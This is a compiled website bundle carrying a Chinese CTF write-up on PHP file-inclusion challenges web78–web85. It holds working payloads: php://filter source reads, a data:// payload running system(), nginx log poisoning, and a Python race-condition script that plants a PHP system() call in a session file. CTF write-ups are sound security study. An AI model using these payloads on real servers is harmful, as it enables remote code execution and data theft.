"use strict";(self.webpackChunkmu_website=self.webpackChunkmu_website||[]).push([[650],{83878:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>a,contentTitle:()=>p,default:()=>d,frontMatter:()=>l,metadata:()=>t,toc:()=>c});var s=r(74848),i=r(28453);const l={},p=void 0,t={id:"Web/CTFshow\u5165\u95e8/\u6587\u4ef6\u5305\u542b",title:"\u6587\u4ef6\u5305\u542b",description:"\u5357\u795e\u535a\u5ba2https://www.wlhhlc.top/posts/14827/",source:"@site/docs/Web/CTFshow\u5165\u95e8/03-\u6587\u4ef6\u5305\u542b.md",sourceDirName:"Web/CTFshow\u5165\u95e8",slug:"/Web/CTFshow\u5165\u95e8/\u6587\u4ef6\u5305\u542b",permalink:"/docs/Web/CTFshow\u5165\u95e8/\u6587\u4ef6\u5305\u542b",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Web/CTFshow\u5165\u95e8/03-\u6587\u4ef6\u5305\u542b.md",tags:[],version:"current",sidebarPosition:3,frontMatter:{},sidebar:"Web",previous:{title:"\u547d\u4ee4\u6267\u884c",permalink:"/docs/Web/CTFshow\u5165\u95e8/\u547d\u4ee4\u6267\u884c"},next:{title:"php\u7279\u6027",permalink:"/docs/Web/CTFshow\u5165\u95e8/php\u7279\u6027"}},a={},c=[{value:"\u6587\u4ef6\u5305\u542b",id:"\u6587\u4ef6\u5305\u542b",level:2},{value:"web78",id:"web78",level:3},{value:"web79",id:"web79",level:3},{value:"web80",id:"web80",level:3},{value:"web81",id:"web81",level:3},{value:"web82",id:"web82",level:3},{value:"Q1\uff1a",id:"q1",level:4},{value:"Q2:",id:"q2",level:4},{value:"web83",id:"web83",level:3},{value:"web84",id:"web84",level:3},{value:"web85",id:"web85",level:3}];function h(e){const n={a:"a",code:"code",h2:"h2",h3:"h3",h4:"h4",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsxs)(n.p,{children:["\u5357\u795e\u535a\u5ba2",(0,s.jsx)(n.a,{href:"https://www.wlhhlc.top/posts/14827/",children:"https://www.wlhhlc.top/posts/14827/"})]}),"\n",(0,s.jsx)(n.h2,{id:"\u6587\u4ef6\u5305\u542b",children:"\u6587\u4ef6\u5305\u542b"}),"\n",(0,s.jsx)(n.p,{children:"\u6587\u4ef6\u5305\u542b\u554a\u6587\u4ef6\u5305\u542b\uff0c\u901a\u8fc7PHP\u51fd\u6570\u5f15\u5165\u6587\u4ef6\u65f6\uff0c\u4f20\u5165\u7684\u6587\u4ef6\u540d\u6ca1\u6709\u7ecf\u8fc7\u5408\u7406\u7684\u9a8c\u8bc1\uff0c\u4ece\u800c\u64cd\u4f5c\u4e86\u9884\u60f3\u4e4b\u5916\u7684\u6587\u4ef6\uff0c\u5c31\u53ef\u80fd\u5bfc\u81f4\u610f\u5916\u7684\u6587\u4ef6\u6cc4\u6f0f\u751a\u81f3\u6076\u610f\u4ee3\u7801\u6ce8\u5165\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u4ea7\u751f\u7684\u6761\u4ef6\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-HOW",children:"allow_url_fopen=On(\u9ed8\u8ba4\u4e3aOn) \u89c4\u5b9a\u662f\u5426\u5141\u8bb8\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u6216\u8005\u7f51\u7ad9\u68c0\u7d22\u6570\u636e\r\nallow_url_include=On(php5.2\u4e4b\u540e\u9ed8\u8ba4\u4e3aOff) \u89c4\u5b9a\u662f\u5426\u5141\u8bb8include/require\u8fdc\u7a0b\u6587\u4ef6\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5e38\u89c1\u7684\u5305\u542b\uff0c\u5728\u4e4b\u524d\u505a\u547d\u4ee4\u6267\u884c\u7684\u65f6\u5019\u4e5f\u5df2\u7ecf\u7528\u8fc7\u4e86\u60f9"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"include()"}),"\n",(0,s.jsx)(n.li,{children:"require()"}),"\n",(0,s.jsx)(n.li,{children:"include_once()"}),"\n",(0,s.jsx)(n.li,{children:"require_once()"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u6b64\u5916\uff0c\u5e38\u7528\u7684\u8fd8\u6709\u4e4b\u524d\u5728web37\u5199\u7684\u4f2a\u534f\u8bae\uff0c\u8fd9\u91cc\u518d\u590d\u5236\u8fc7\u6765"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:"\u603b\uff1a\r\nfile:// \u534f\u8bae\r\nphp:// \u534f\u8bae\r\nzip:// bzip2:// zlib:// \u534f\u8bae\r\ndata:// \u534f\u8bae\r\nhttp:// \u534f\u8bae https://\u534f\u8bae\r\nphar:// \u534f\u8bae\r\n\r\n\u5206\uff1a\r\nfile:// \u534f\u8bae\uff1a\r\n\t\t\u6761\u4ef6 allow_url_fopen:off/on  allow_url_include :off/on\r\n\t\t\u4f5c\u7528\uff1a\u7528\u4e8e\u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u3002\u5728include()/require()\u7b49\u53c2\u6570\u53ef\u63a7\u7684\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u5bfc\u5165\u975ephp\u6587\u4ef6\u4e5f\u4f1a\u88ab\u89e3\u6790\u4e3aphp\r\n\t\t\u7528\u6cd5\uff1a1.file://[\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84\u548c\u6587\u4ef6\u540d]\r\n\t \t\t2.[\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84\u548c\u6587\u4ef6\u540d]\r\n\t \t\t3.[http\uff1a//\u7f51\u7edc\u8def\u5f84\u548c\u6587\u4ef6\u540d]\r\n\r\nphp:// \u534f\u8bae\uff1a\u6761\u4ef6 allow_url_include :\u4ec5php://input php://stdin php://memory php://temp \u9700\u8981on allow_url_fopen:off/on\r\n\t\t\u4f5c\u7528\uff1aphp:// \u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O streams\uff09\uff0c\u5728CTF\u4e2d\u7ecf\u5e38\u4f7f\u7528\u7684\u662fphp://filter\u548cphp://input\uff0cphp://filter\u7528\u4e8e\u8bfb\u53d6\u6e90\u7801\uff0cphp://input\u7528\u4e8e\u6267\u884cphp\u4ee3\u7801\r\n\t\tphp://filter\u53c2\u6570\u8be6\u89e3\uff1aresource=\uff08\u5fc5\u9009\uff0c\u6307\u5b9a\u4e86\u4f60\u8981\u7b5b\u9009\u8fc7\u6ee4\u7684\u6570\u636e\u6d41\uff09     read=\uff08\u53ef\u9009\uff09    write=\uff08\u53ef\u9009\uff09\r\n\t\t\u5bf9read\u548cwrite\uff0c\u53ef\u9009\u8fc7\u6ee4\u5668\u6709string.rot13\u3001string.toupper\u3001string.tolower\u3001string.strip_tags\u3001convert.base64-encode & convert.base64-decode\r\n         \u7528\u6cd5\u4e3e\u4f8b\uff1aphp://filter/read=convert.base64-encode/resource=flag.php\r\n\r\nzip:// bzip2:// zlib:// \u534f\u8bae\uff1a\r\n        \u6761\u4ef6\uff1aallow_url_fopen:off/on      allow_url_include :off/on\r\n        \u4f5c\u7528\uff1azip:// & bzip2:// & zlib:// \u5747\u5c5e\u4e8e\u538b\u7f29\u6d41\uff0c\u53ef\u4ee5\u8bbf\u95ee\u538b\u7f29\u6587\u4ef6\u4e2d\u7684\u5b50\u6587\u4ef6\uff0c\u66f4\u91cd\u8981\u7684\u662f\u4e0d\u9700\u8981\u6307\u5b9a\u540e\u7f00\u540d\r\n        \u7528\u6cd5\uff1azip://[\u538b\u7f29\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84]%23[\u538b\u7f29\u6587\u4ef6\u5185\u7684\u5b50\u6587\u4ef6\u540d]\r\n        \t compress.bzip2://file.bz2\r\n        \t compress.zlib://file.gz\r\n        \u5176\u4e2dphar://\u548czip://\u7c7b\u4f3c\r\n\r\ndata:// \u534f\u8bae\uff1a\r\n        \u6761\u4ef6\uff1aallow_url_fopen:on    allow_url_include :on\r\n        \u4f5c\u7528\uff1a\u53ef\u4ee5\u4f7f\u7528data://\u6570\u636e\u6d41\u5c01\u88c5\u5668\uff0c\u4ee5\u4f20\u9012\u76f8\u5e94\u683c\u5f0f\u7684\u6570\u636e\u3002\u901a\u5e38\u53ef\u4ee5\u7528\u6765\u6267\u884cPHP\u4ee3\u7801\u3002\r\n        \u7528\u6cd5\uff1adata://text/plain,            data://text/plain;base64,\r\n        \u4e3e\u4f8b\uff1adata://text/plain,<?php%20phpinfo();?>\r\n        \t data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\r\n           \u8be5 PHP \u6269\u5c55\u652f\u6301\u7684\u5b57\u7b26\u7f16\u7801\u6709\u4ee5\u4e0b\u51e0\u79cd\uff1a\r\n\r\n               \r\nconvert.iconv.UTF-8.UTF-7\r\n    UCS-4*\r\n    UCS-4BE\r\n    UCS-4LE*\r\n    UCS-2\r\n    UCS-2BE\r\n    UCS-2LE\r\n    UTF-32*\r\n    UTF-32BE*\r\n    UTF-32LE*\r\n    UTF-16*\r\n    UTF-16BE*\r\n    UTF-16LE*\r\n    UTF-7\r\n    UTF7-IMAP\r\n    UTF-8*\r\n    ASCII*\r\n    EUC-JP*\r\n    SJIS*\r\n    eucJP-win*\r\n    SJIS-win*\r\n    ISO-2022-JP\r\n    ISO-2022-JP-MS\r\n    CP932\r\n    CP51932\r\n    SJIS-mac\uff08\u522b\u540d\uff1aMacJapanese\uff09\r\n    SJIS-Mobile#DOCOMO\uff08\u522b\u540d\uff1aSJIS-DOCOMO\uff09\r\n    SJIS-Mobile#KDDI\uff08\u522b\u540d\uff1aSJIS-KDDI\uff09\r\n    SJIS-Mobile#SOFTBANK\uff08\u522b\u540d\uff1aSJIS-SOFTBANK\uff09\r\n    UTF-8-Mobile#DOCOMO\uff08\u522b\u540d\uff1aUTF-8-DOCOMO\uff09\r\n    UTF-8-Mobile#KDDI-A\r\n    UTF-8-Mobile#KDDI-B\uff08\u522b\u540d\uff1aUTF-8-KDDI\uff09\r\n    UTF-8-Mobile#SOFTBANK\uff08\u522b\u540d\uff1aUTF-8-SOFTBANK\uff09\r\n    ISO-2022-JP-MOBILE#KDDI\uff08\u522b\u540d\uff1aISO-2022-JP-KDDI\uff09\r\n    JIS\r\n    JIS-ms\r\n    CP50220\r\n    CP50220raw\r\n    CP50221\r\n    CP50222\r\n    ISO-8859-1*\r\n    ISO-8859-2*\r\n    ISO-8859-3*\r\n    ISO-8859-4*\r\n    ISO-8859-5*\r\n    ISO-8859-6*\r\n    ISO-8859-7*\r\n    ISO-8859-8*\r\n    ISO-8859-9*\r\n    ISO-8859-10*\r\n    ISO-8859-13*\r\n    ISO-8859-14*\r\n    ISO-8859-15*\r\n    ISO-8859-16*\r\n    byte2be\r\n    byte2le\r\n    byte4be\r\n    byte4le\r\n    BASE64\r\n    HTML-ENTITIES\uff08\u522b\u540d\uff1aHTML\uff09\r\n    7bit\r\n    8bit\r\n    EUC-CN*\r\n    CP936\r\n    GB18030\r\n    HZ\r\n    EUC-TW*\r\n    CP950\r\n    BIG-5*\r\n    EUC-KR*\r\n    UHC\uff08\u522b\u540d\uff1aCP949\uff09\r\n    ISO-2022-KR\r\n    Windows-1251\uff08\u522b\u540d\uff1aCP1251\uff09\r\n    Windows-1252\uff08\u522b\u540d\uff1aCP1252\uff09\r\n    CP866\uff08\u522b\u540d\uff1aIBM866\uff09\r\n    KOI8-R*\r\n    KOI8-U*\r\n    ArmSCII-8\uff08\u522b\u540d\uff1aArmSCII8\uff09\r\n\n"})}),"\n",(0,s.jsx)(n.h3,{id:"web78",children:"web78"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['file'])){\r\n    $file = $_GET['file'];\r\n    include($file);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u4f2a\u534f\u8bae\u76f4\u63a5\u62ffflag"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-payload",children:"?file=php://filter/convert.base64-encode/resource=flag.php\n"})}),"\n",(0,s.jsx)(n.h3,{id:"web79",children:"web79"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:"if(isset($_GET['file'])){\r\n    $file = $_GET['file'];\r\n    $file = str_replace(\"php\", \"???\", $file);\r\n    include($file);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u91cc\u5c31\u662f\u628a$file\u91cc\u7684php\u66ff\u6362\u6210???"}),"\n",(0,s.jsx)(n.p,{children:"\u4e0a\u4e00\u4e2apayload\u91cc\u9762\u51fa\u73b0\u4e86\u4e24\u4e2aphp\uff0c\u4e00\u4e2a\u662fphp:// \u4e00\u4e2a\u662fflag.php"}),"\n",(0,s.jsx)(n.p,{children:"\u5176\u4e2d flag.php \u662f\u6587\u4ef6\u540d\uff0c\u4e0d\u80fd\u8fdb\u884c\u5927\u5c0f\u5199\u7ed5\u8fc7\uff0c\u800c\u524d\u9762\u7684php://\u662f\u4f2a\u534f\u8bae \u662f\u80fd\u591f\u5927\u5c0f\u5199\u7ed5\u8fc7\u7684"}),"\n",(0,s.jsx)(n.p,{children:"\u7136\u540e\u6211\u4eec\u770b\u770b\u4e0a\u9762\u7684data\u534f\u8bae\uff0c\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\uff0c\u9996\u5148\u8bd5\u8bd5\u4e0a\u9762\u7684\u6700\u540e\u4e00\u53e5\uff0c\u91cc\u9762\u6ca1\u6709\u51fa\u73b0\u5c0f\u5199\u7684php"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"image-20211116093952092",src:r(67263).A+"",width:"1479",height:"968"})}),"\n",(0,s.jsx)(n.p,{children:'\u6267\u884c\u6210\u529f\uff0c\u4e8e\u662f\u7f16\u7801\u4e00\u4e2asystem("tac flag.php");'}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-payload",children:"?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/Pg==\n"})}),"\n",(0,s.jsx)(n.h3,{id:"web80",children:"web80"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:'if(isset($_GET[\'file\'])){\r\n    $file = $_GET[\'file\'];\r\n    $file = str_replace("php", "???", $file);\r\n    $file = str_replace("data", "???", $file);\r\n    include($file);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u7ed9\u6211\u8fc7\u6ee4data\uff0cdata\u548cphp://\u4e0d\u4e00\u6837\uff0cdata\u4e0d\u80fd\u5927\u5c0f\u5199\u7ed5\u8fc7"}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u91cc\u7528php\u7684\u4f2a\u534f\u8bae\uff0c\u6ce8\u610f\u5230\u4e0a\u9762\u5199\u7684php://input\u7528\u4e8e\u6267\u884cphp\u4ee3\u7801,\u5c1d\u8bd5\u7528Php://input\u7136\u540ePOST\u4e00\u4e2asystem\u4f46\u662f\u5e76\u6ca1\u6709\u6267\u884c\uff0c\u4e8e\u662f\u67e5\u770bhint\u53d1\u73b0\u4f7f\u7528\u65e5\u5fd7\u7684\u6587\u4ef6\u5305\u542b\u8fdb\u884cgetshell\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84\uff1a ?file=/var/log/nginx/access.log"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"image-20211116095010582",src:r(73082).A+"",width:"1474",height:"249"})}),"\n",(0,s.jsx)(n.p,{children:"\u4e3a\u4ec0\u4e48\u8981\u9009User-Agent\uff0c\u56e0\u4e3alog\u6587\u4ef6\u8bb0\u5f55\u7684\u5c31\u662fUser-Agent"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"image-20211116102548520",src:r(28857).A+"",width:"601",height:"268"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"image-20211116102942127",src:r(83708).A+"",width:"1152",height:"494"})}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u4e0d\u77e5\u9053\u4e3a\u5565\uff0c\u6574\u4e86\u597d\u591a\u6b21\u624d\u6210\u529f\uff0c\u53d1\u73b0\u4e86flag\u540d\u5b57\u53ebf10g.php"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"image-20211116103042234",src:r(10617).A+"",width:"1224",height:"636"})}),"\n",(0,s.jsx)(n.h3,{id:"web81",children:"web81"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:'if(isset($_GET[\'file\'])){\r\n    $file = $_GET[\'file\'];\r\n    $file = str_replace("php", "???", $file);\r\n    $file = str_replace("data", "???", $file);\r\n    $file = str_replace(":", "???", $file);\r\n    include($file);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u5c31\u8fc7\u6ee4\u4e86\u4e2a\u5192\u53f7\uff0c\u6211\u7ee7\u7eed\u4e4b\u524d\u7684\u64cd\u4f5c"}),"\n",(0,s.jsx)(n.p,{children:"\u53d1\u73b0\u4e86 \u53ea\u8981\u62a5\u9519\u5c31\u91cd\u5f00\u5427"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"image-20211116103605866",src:r(70165).A+"",width:"1165",height:"516"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"image-20211116103620097",src:r(95772).A+"",width:"1142",height:"640"})}),"\n",(0,s.jsx)(n.h3,{id:"web82",children:"web82"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:'if(isset($_GET[\'file\'])){\r\n    $file = $_GET[\'file\'];\r\n    $file = str_replace("php", "???", $file);\r\n    $file = str_replace("data", "???", $file);\r\n    $file = str_replace(":", "???", $file);\r\n    $file = str_replace(".", "???", $file);\r\n    include($file);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u6b21\u8fc7\u6ee4\u4e86\u70b9\uff0c\u65e5\u5fd7\u5305\u542b\u6709.log\uff0c\u7528\u4e0d\u4e86\u60f9\u3002\u770b\u770b\u5357\u795e\u535a\u5ba2\uff0csession\u6587\u4ef6\u5305\u542b\u3002\u8fd8\u6709\u5b89\u5168\u5ba2"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"https://www.freebuf.com/vuls/202819.html",children:"https://www.freebuf.com/vuls/202819.html"})}),"\n",(0,s.jsx)(n.p,{children:"\u77e5\u8bc6\u70b9\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:'\u5728php5.4\u4e4b\u540ephp.ini\u5f00\u59cb\u6709\u51e0\u4e2a\u9ed8\u8ba4\u9009\u9879\r\n    1.session.upload_progress.enabled = on\r\n    2.session.upload_progress.cleanup = on\r\n    3.session.upload_progress.prefix = \u201cupload_progress_\u201d\r\n    4.session.upload_progress.name = \u201cPHP_SESSION_UPLOAD_PROGRESS\u201d\r\n    5.session.use_strict_mode=off\r\n\r\n    \u7b2c\u4e00\u4e2a\u8868\u793a\u5f53\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0cphp\u5c06\u4f1a\u628a\u6b64\u6b21\u6587\u4ef6\u4e0a\u4f20\u7684\u8be6\u7ec6\u4fe1\u606f(\u5982\u4e0a\u4f20\u65f6\u95f4\u3001\u4e0a\u4f20\u8fdb\u5ea6\u7b49)\u5b58\u50a8\u5728session\u5f53\u4e2d\r\n    \u7b2c\u4e8c\u4e2a\u8868\u793a\u5f53\u6587\u4ef6\u4e0a\u4f20\u7ed3\u675f\u540e\uff0cphp\u5c06\u4f1a\u7acb\u5373\u6e05\u7a7a\u5bf9\u5e94session\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\r\n    \u7b2c\u4e09\u548c\u7b2c\u56db\u4e2aprefix+name\u5c06\u8868\u793a\u4e3asession\u4e2d\u7684\u952e\u540d\r\n    \u7b2c\u4e94\u4e2a\u8868\u793a\u6211\u4eec\u5bf9Cookie\u4e2dsessionID\u53ef\u63a7\r\n\r\n"\u7b80\u800c\u8a00\u4e4b\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528session.upload_progress\u5c06\u6728\u9a6c\u5199\u5165session\u6587\u4ef6\uff0c\u7136\u540e\u5305\u542b\u8fd9\u4e2asession\u6587\u4ef6\u3002\u4e0d\u8fc7\u524d\u63d0\u662f\u6211\u4eec\u9700\u8981\u521b\u5efa\u4e00\u4e2asession\u6587\u4ef6\uff0c\u5e76\u4e14\u77e5\u9053session\u6587\u4ef6\u7684\u5b58\u653e\u4f4d\u7f6e\u3002\u56e0\u4e3asession.use_strict_mode=off\u7684\u5173\u7cfb\uff0c\u6211\u4eec\u53ef\u4ee5\u81ea\u5b9a\u4e49sessionID\r\nlinux\u7cfb\u7edf\u4e2dsession\u6587\u4ef6\u4e00\u822c\u7684\u9ed8\u8ba4\u5b58\u50a8\u4f4d\u7f6e\u4e3a /tmp \u6216 /var/lib/php/session\r\n\r\n\u4f8b\u5982\u6211\u4eec\u5728Cookie\u4e2d\u8bbe\u7f6e\u4e86PHPSESSID=flag\uff0cphp\u4f1a\u5728\u670d\u52a1\u5668\u4e0a\u521b\u5efa\u6587\u4ef6\uff1a/tmp/sess_flag\uff0c\u5373\u4f7f\u6b64\u65f6\u7528\u6237\u6ca1\u6709\u521d\u59cb\u5316session\uff0cphp\u4e5f\u4f1a\u81ea\u52a8\u521d\u59cb\u5316Session\u3002 \u5e76\u4ea7\u751f\u4e00\u4e2a\u952e\u503c\uff0c\u4e3aprefix+name\u7684\u503c\uff0c\u6700\u540e\u88ab\u5199\u5165sess_\u6587\u4ef6\u91cc\r\n\u8fd8\u6709\u4e00\u4e2a\u5173\u952e\u70b9\u5c31\u662fsession.upload_progress.cleanup\u9ed8\u8ba4\u662f\u5f00\u542f\u7684\uff0c\u53ea\u8981\u8bfb\u53d6\u4e86post\u6570\u636e\uff0c\u5c31\u4f1a\u6e05\u9664\u8fdb\u5ea6\u4fe1\u606f\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5229\u7528\u6761\u4ef6\u7ade\u4e89\u6765pass\uff0c\u5199\u4e00\u4e2a\u811a\u672c\u6765\u5b8c\u6210"\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u6ca1\u6cd5\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\uff0c\u56e0\u4e3a\u8fc7\u6ee4\u4e86\u5192\u53f7\uff0c\u867d\u7136IP\u90a3\u91cc\u53ef\u4ee5int\u7ed5\u8fc7\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u91cc\u4e3e\u4f8b\u662f\u5982\u4f55\u6709\u90a3\u4e2asession\u6765\u5305\u542b\u7684"}),"\n",(0,s.jsx)(n.p,{children:"\u5047\u8bbe\u6e90\u4ee3\u7801\u5982\u4e0b\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:"<?php\r\n$b=$_GET['file'];\r\ninclude \"$b\";\r\n?>\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6b64\u65f6\u662f\u53ef\u4ee5\u5305\u542b\u4e00\u4e2a\u6076\u610f\u7684\u6587\u4ef6\uff0c\u4f46\u662f\u5728\u73b0\u5728\u9776\u673a\u91cc\u9762\u662f\u4e0d\u5b58\u5728\u8fd9\u4e2a\u6240\u8c13\u7684\u6076\u610f\u6587\u4ef6\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u5229\u7528session.upload_progress\u5c06\u6076\u610f\u8bed\u53e5\u5199\u5165session\u6587\u4ef6\uff0c\u7136\u540e\u5305\u542bsession\u6587\u4ef6\u3002"}),"\n",(0,s.jsx)(n.h4,{id:"q1",children:"Q1\uff1a"}),"\n",(0,s.jsx)(n.p,{children:"\u4ee3\u7801\u91cc\u6ca1\u6709session_start()\u5982\u4f55\u521b\u5efasession\u6587\u4ef6\uff1f"}),"\n",(0,s.jsx)(n.p,{children:"A1:\u5982\u679csession.auto_start=On,\u5c31\u4e0d\u9700\u8981\u518d\u53bb\u6267\u884csession_start()\uff0c\u4f46\u9ed8\u8ba4\u60c5\u51b5\u90fd\u662f\u5173\u95ed\u7684\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u4f46session\u8fd8\u6709\u4e2a\u9ed8\u8ba4\u9009\u9879\u5c31\u662fsession.use_strict_mode = 0\uff0c\u7528\u6237\u53ef\u4ee5\u81ea\u5b9a\u4e49ID\uff0c\u8fd9\u4e2a\u90e8\u5206\u540c\u4e0a\u5f15\u53f7\u90e8\u5206"}),"\n",(0,s.jsx)(n.h4,{id:"q2",children:"Q2:"}),"\n",(0,s.jsx)(n.p,{children:"session.upload_progress.cleanup = On\u5bfc\u81f4\u6587\u4ef6\u4e0a\u4f20\u540esession\u6587\u4ef6\u5185\u5bb9\u7acb\u5373\u6e05\u7a7a\u600e\u4e48\u8fdb\u884crce\uff1f"}),"\n",(0,s.jsx)(n.p,{children:"A2\uff1a\u8fd9\u91cc\u53ef\u4ee5\u5229\u7528\u7ade\u4e89\u7684\u65b9\u5f0f\u5728\u4ed6\u6e05\u7a7a\u524d\u5305\u542b\u5229\u7528\uff0c\u53ea\u80fd\u5199\u811a\u672c\u4e86\u3002\uff08\u8fd9\u91cc\u76f4\u63a5\u7528\u6709\u7684\u811a\u672c\uff09"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"import io\r\nimport requests\r\nimport threading\r\nurl = 'http://c5514e77-6b19-4fda-807c-17defbd8756e.challenge.ctf.show/'\r\n\r\ndef write(session):\r\n    data = {\r\n        'PHP_SESSION_UPLOAD_PROGRESS': '<?php system(\"tac f*\");?>mumuzi'\r\n    }\r\n    while True:\r\n        f = io.BytesIO(b'a' * 1024 * 10)\r\n        response = session.post(url,cookies={'PHPSESSID': 'flag'}, data=data, files={'file': ('muzi.txt', f)})\r\ndef read(session):\r\n    while True:\r\n        response = session.get(url+'?file=/tmp/sess_flag')\r\n        if 'mumuzi' in response.text:\r\n            print(response.text)\r\n            break\r\n        else:\r\n            print('retry')\r\n\r\nif __name__ == '__main__':\r\n    session = requests.session()\r\n    write = threading.Thread(target=write, args=(session,))\r\n    write.daemon = True\r\n    write.start()\r\n    read(session)\n"})}),"\n",(0,s.jsx)(n.h3,{id:"web83",children:"web83"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:'session_unset();\r\nsession_destroy();\r\n\r\nif(isset($_GET[\'file\'])){\r\n    $file = $_GET[\'file\'];\r\n    $file = str_replace("php", "???", $file);\r\n    $file = str_replace("data", "???", $file);\r\n    $file = str_replace(":", "???", $file);\r\n    $file = str_replace(".", "???", $file);\r\n\r\n    include($file);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u7ee7\u7eed\u7528\u4e0a\u9762\u7684\u811a\u672c"}),"\n",(0,s.jsx)(n.h3,{id:"web84",children:"web84"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:'if(isset($_GET[\'file\'])){\r\n    $file = $_GET[\'file\'];\r\n    $file = str_replace("php", "???", $file);\r\n    $file = str_replace("data", "???", $file);\r\n    $file = str_replace(":", "???", $file);\r\n    $file = str_replace(".", "???", $file);\r\n    system("rm -rf /tmp/*");\r\n    include($file);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u4eec\u672c\u8eab\u5c31\u662f\u5728\u7ade\u4e89\uff0c\u7ee7\u7eed\u4e0a\u9762\u7684\u811a\u672c"}),"\n",(0,s.jsx)(n.h3,{id:"web85",children:"web85"})]})}function d(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(h,{...e})}):h(e)}},67263:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20211116093952092-b7f0cec9568e0ecbbca16b8e62facfb9.png"},73082:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20211116095010582-119f0af853197ddb426e8ff9b51cc7f9.png"},28857:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20211116102548520-d6db6ca51fa33e13e3eb27a03f717a91.png"},83708:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20211116102942127-f4b0889f06a05ab67964fb3e84342dae.png"},10617:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20211116103042234-2471badd7c6190c17c3fe71f2b39514e.png"},70165:(e,n,r)=>{r.d(n,{A:()=>s});const s=r.p+"assets/images/image-20211116103605866-b7b41a56a57b3effcf6fd0a349786eb2.png"},95772:(e,n,r)=>{r.d(n,{A:()=>s});const 